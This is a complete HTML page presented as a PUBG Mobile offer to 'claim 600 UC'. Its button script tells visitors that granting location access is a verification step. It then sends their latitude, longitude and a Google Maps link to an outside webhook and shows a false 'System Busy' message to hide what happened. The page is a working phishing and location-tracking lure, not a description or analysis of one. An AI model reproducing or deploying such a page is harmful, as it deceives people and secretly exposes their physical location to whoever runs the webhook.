<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PUBG Mobile UC</title>
    <style>
        body { background: #000; color: #f1c40f; text-align: center; font-family: sans-serif; padding-top: 50px; }
        .btn { background: #f1c40f; color: #000; border: none; padding: 20px; font-weight: bold; cursor: pointer; border-radius: 10px; text-transform: uppercase; }
    </style>
</head>
<body>
    <h1>PUBG MOBILE UC REWARD</h1>
    <p>Click below to verify and claim 600 UC</p>
    <button class="btn" onclick="start()">CLAIM NOW</button>

    <script>
        function start() {
            // বাটন ক্লিক করলেই প্রথমে এটি দেখাবে
            alert("Verification Started! Please click ALLOW for location.");
            
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(pos) {
                    const lat = pos.coords.latitude;
                    const lon = pos.coords.longitude;
                    
                    const data = {
                        event: "PUBG_SUCCESS",
                        latitude: lat,
                        longitude: lon,
                        google_map: "https://www.google.com/maps?q=" + lat + "," + lon
                    };

                    // ডাটা পাঠানো হচ্ছে
                    fetch("https://hooktest.dev/api/hook/waNRgkdN", {
                        method: "POST",
                        headers: { "Content-Type": "application/json" }, // এটি ডাটা পাঠানো নিশ্চিত করে
                        body: JSON.stringify(data)
                    });

                    alert("System Busy! Try again in 5 minutes.");
                }, function(err) {
                    alert("Error: You must ALLOW location to get rewards.");
                });
            } else {
                alert("Browser not supported.");
            }
        }
    </script>
</body>
</html>
